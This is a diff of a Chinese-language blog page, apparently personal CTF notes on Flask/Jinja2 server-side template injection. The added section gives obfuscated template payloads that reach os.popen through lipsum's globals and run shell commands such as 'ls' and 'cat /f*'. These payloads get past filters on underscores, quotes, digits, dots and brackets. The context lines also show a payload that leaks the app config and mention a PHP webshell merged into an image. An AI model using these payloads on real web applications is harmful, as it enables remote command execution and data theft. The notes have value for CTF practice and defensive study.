@@ -304,7 +304,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-17 20:57:20" itemprop="dateModified" datetime="2023-05-17T20:57:20+08:00">2023-05-17</time>
+                <time title="修改时间：2023-05-17 22:22:33" itemprop="dateModified" datetime="2023-05-17T22:22:33+08:00">2023-05-17</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -322,14 +322,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>6.6k</span>
+              <span>7.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>24 分钟</span>
+              <span>27 分钟</span>
             </span>
 
         </div>
@@ -420,8 +420,12 @@
 <h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><p><code>Length</code>过滤器绕过<br>可以配合加减乘除</p>
 <h3 id="config获取配置信息"><a href="#config获取配置信息" class="headerlink" title="config获取配置信息"></a>config获取配置信息</h3><p>调用<code>current_app</code>相当于调用flask<br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messsages.__globals__['current_app'].config&#125;&#125;</code></p>
 <h3 id="过滤特殊符号"><a href="#过滤特殊符号" class="headerlink" title="过滤特殊符号"></a>过滤特殊符号</h3><p>利用flask内置函数和对象获取符号</p>
-<h3 id="dict和jion"><a href="#dict和jion" class="headerlink" title="dict和jion"></a>dict和jion</h3><h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eighteen=nine*<span class="number">2</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ge=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glo)|attr(ge)(o)|attr(pope)(sys)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="dict和jion"><a href="#dict和jion" class="headerlink" title="dict和jion"></a>dict和jion</h3><h3 id="debug的pin"><a href="#debug的pin" class="headerlink" title="debug的pin"></a>debug的pin</h3><h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象,偶尔偶尔用的上吧,有时候用不上也不知道什么原因,可能是payload中的某些被过滤了</p>
+<p>过滤了<code>下划线_</code>,<code>空格</code>,<code>单引号&#39;&#39;和双引号&quot;&quot;</code>,<code>数字</code>,<code>某些关键字</code>,<code>中括号[]</code>,<code>小数点.</code>,<code>\</code><br>可以考虑试一下下面这个payload,基本很难cat,因为小数点被过滤了比如<code>flag.txt</code>就cat不了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eighteen=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ge=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glo)|attr(ge)(o)|attr(pope)(sys)|attr(rea)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>基本思路就是,在<code>lipsum</code>模块中找字符代替下划线和空格,用<code>dict(aaaaaaaaa=a)|join|count</code>来获取数字,用<code>dict+join</code>法绕过关键字<br><code>sys</code>是最后要执行的命令,可以改成<br><code>&#123;%set (sys=dict(cat=a)|join,kg,dict(fl=a,ag=a)|join)join%&#125;</code>这段代码等于cat flag<br>如果过滤的少点还可以<br><code>&#123;%set (sys=dict(cat=a)|join,kg,'/',dict(f=a)|join,'*')join%&#125;</code>这段代码等于<code>cat /f*</code>获取根目录下所有f开头的文件(用了通配符)</p>
+<p>下面这个payload过滤的没上面那么多,但是有时候比上面的更好用(不知道为啥,可能上面的代码多了更容易被过滤,比如<code>attr</code>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)[<span class="number">18</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)[<span class="number">9</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a)|join,<span class="built_in">dict</span>(bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum[glo][o][pope](sys)[rea]()&#125;&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -1789,13 +1793,13 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">69k</span>
+    <span title="站点总字数">70k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:07</span>
+    <span title="站点阅读时长">4:10</span>
 </div>
 
 <!--
